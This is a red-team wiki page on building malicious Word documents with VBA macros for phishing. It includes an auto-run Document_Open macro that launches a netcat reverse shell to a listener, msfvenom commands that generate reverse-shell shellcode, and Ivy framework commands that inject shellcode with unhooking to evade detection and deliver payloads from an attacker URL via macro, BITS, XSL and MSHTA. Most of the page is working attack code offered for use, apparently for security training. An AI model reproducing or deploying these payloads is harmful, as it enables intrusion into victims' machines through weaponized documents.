---
description: MITRE ATT&CK™ T1137 - Phishing
---

# VBA

## Theory

This technique will build a primitive word document that will auto execute the VBA Macros code once the Macros protection is disabled.

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.

{% hint style="info" %}
VBAs/macros by themselves do not inherently bypass any detections.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Basic Usage" %}
1 - Create new word document (CTRL+N)\
2 - Hit ALT+F11 to go into Macro editor\
3 - Double click into the "This document" and CTRL+C/V the below:

```bash
#Macro
Private Sub Document_Open()
  MsgBox "game over", vbOKOnly, "game over"
  a = Shell("C:\tools\shell.cmd", vbHide)
End Sub
```

```bash
#C:\tools\shell.cmd
C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
```

4 - ALT+F11 to switch back to the document editing mode\
5 - Save the file as a macro enabled document, for example as dotm, Word 97-2003 Document.
{% endtab %}

{% tab title="Ivy" %}
[Ivy](https://github.com/optiv/Ivy) is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode.

First, we have to generate payload for both x86 and x64 architecture:

```bash
#x64
msfvenom -p -a x64 windows/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<ATTACKING_PORT> -f raw > stageless64.bin

#x64
msfvenom -p -a x86 windows/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<ATTACKING_PORT> -f raw > stageless86.bin
```

Now we can generate the malicious js file that will load our payload.

```bash
# Inject mode performs a process injection attack 
# where a new process is spawned in a suspended state and the shellcode is injected into the process
# This is for a Stagless Injected payload spawning notepad.exe
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless86.bin -P Inject -process64 C:\\windows\\system32\\notepad.exe -process32 C:\\windows\\SysWOW64\\notepad.exe -O stageless.js 

# The stealthier option is Local. This loads the shellcode directly into the current Office process.
# It comes with additional features to avoid detection 
# This is for a Unhooked Stagless Local payload
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless86.bin -P Local -unhook -O stageless.js

# This is for Non-Executable File Types payload
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless86.bin -P Local -unhook -O stageless.png
```

We can execute this payload by using cscript.exe or build a loader using MSHTA.exe, Macro downloader, Stylesheet Ivy options:

```bash
# Simply execute payload on the windows target (stageless.png contains js)
cscript //E:jscript stageless.png

#Generate a Js payload and an evil macro for delivery
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless86.bin -P Inject -unhook -O stageless.js -delivery macro -url http://ATTACKING_IP

#Generate a Js payload oneliner for BitsAdmin delivery
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.js -url http://ATTACKING_IP -delivery bits -stageless

#Gneerate a XSL payload and oneliner for Stylsheet delivery
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.xsl -url http://ATTACKING_IP -delivery xsl -stageless

#Generate a oneliner and hta payload for MSHTA.exe delivery
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.hta -url http://ATTACKING_IP -delivery hta -stageless
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/weaponization" %}

{% embed url="https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce" %}
